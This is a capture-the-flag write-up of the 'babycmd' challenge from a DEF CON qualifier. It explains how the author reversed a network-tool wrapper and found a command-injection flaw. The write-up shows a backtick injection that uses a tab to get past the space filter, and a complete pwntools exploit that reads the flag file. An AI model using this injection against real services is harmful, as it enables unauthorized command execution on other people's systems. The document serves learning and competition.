### Solved by superkojiman

babycmd is a 1 point challenge. Connecting to the specified server presents the following menu: 

```
koji@pwnbox:~$ ./sploit.py 
[+] Opening connection to babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me on port 15491: Done

Welcome to another Baby's First Challenge!

koji@pwnbox:~$ nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491

Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: 
```

Entering one of the commands would call the actual command on the server and pass it a hostname or IP address specified and return the result. Eg: 

```
: host google.com
google.com has address 74.125.228.230
google.com has address 74.125.228.231
google.com has address 74.125.228.232
google.com has address 74.125.228.233
google.com has address 74.125.228.238
google.com has address 74.125.228.224
google.com has address 74.125.228.225
google.com has address 74.125.228.226
google.com has address 74.125.228.227
google.com has address 74.125.228.228
google.com has address 74.125.228.229
google.com has IPv6 address 2607:f8b0:4004:808::1007
google.com mail is handled by 10 aspmx.l.google.com.
google.com mail is handled by 20 alt1.aspmx.l.google.com.
google.com mail is handled by 30 alt2.aspmx.l.google.com.
google.com mail is handled by 40 alt3.aspmx.l.google.com.
google.com mail is handled by 50 alt4.aspmx.l.google.com.
Commands: ping, dig, host, exit
: 
```

I loaded the binary in gdb-peda and looked at the output of checksec:

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : disabled
```

That’s a lot of security for a 1 point challenge, so I assumed no stack smashing was required. I decided to go with the assumption that babycmd was vulnerable to command injection. 

After spending a bit of time reversing the binary, I noticed that each command was run slightly differently depending on the argument passed to it. For example, if 'host' was called with an IP address, it would build the command to pass to popen() as "host %s". However, if I passed a hostname like pwn.com, it would build the command as "host \"%s\"". That seemed odd, so I decided to dig into it further.

When the 'host' and 'dig' commands are used, two functions are called to check each character in the argument. The first function, sub_d65() filters out !, ", #, $, %, &, |, and *. This first check allows characters 0x3b to 0x7f in the ASCII table. 

The second function does another check and is at sub_dcc(). When this function returns a non-zero value, the command is successfully built and can be used by popen() somewhere down the line. So essentially it looks like this:

```c
sub_10bd() {
    if (sub_d65()) {
        if (inet_aton(host_arg)) {
            // IP address provided
            sprintf(command, "host %s", inet_ntoa(host_arg));
        } else {
            // hostname provided
            if (sub_dcc() != 0) {
                sprintf("command, "host \"%s\", host_arg); 
            }
        }
    }
}
```


Injecting a command into the argument will surely cause inet_aton() to fail, so that means we need to make sure sub_d65() and sub_dcc() succeed so that the injection we send will work. 

As it turns, out this is fairly easy since the backtick character isn't blacklisted. Therefore we could send something like: pwn\`uname\`.com and it would return:

```text
koji@pwnbox:~$ nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491

Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: host pwn`uname`.com
Host pwnLinux.com not found: 3(NXDOMAIN)
Commands: ping, dig, host, exit
:
```

Notice that the output of uname (Linux) is visible in the error message from 'host'. There was one small problem; the space character was filtered out. Fortunately this was easily fixed by using a tab character instead. 

From here on it was easy to enumerate the target server. I found out that the service was running under the user babycmd (of course) and that the flag was in /home/babycmd. Reading /home/babycmd/flag gave the following:

```
koji@pwnbox:~$ ./sploit.py 
[+] Opening connection to babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me on port 15491: Done

Welcome to another Baby's First Challenge!

Commands: ping, dig, host, exit
: 
host: 'pwnThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??.com' is not a legal name (label too long)
Commands: ping, dig, host, exit
: 
[*] Closed connection to babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me port 15491
```

The flag is: **Pretty easy eh!!~ Now let's try something hArd3r, shallwe??**

Here's the exploit I wrote up:

```python
#!/usr/bin/env python

from pwn import *

r = remote("babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me", 15491)

print r.recv()

cmd = "cat\t/home/babycmd/flag"     # can't use space, but we can use tab

buf = ""
buf += "host "      # host command is vulnerable
buf += "pwn`"       # we can use `` to execute commands betweent he hostname
buf += cmd          # inject command here
buf +="`.com"       # host needs this to be a valid hostname
buf += "\n"

r.send(buf)
print r.recv()
print r.recv()
```

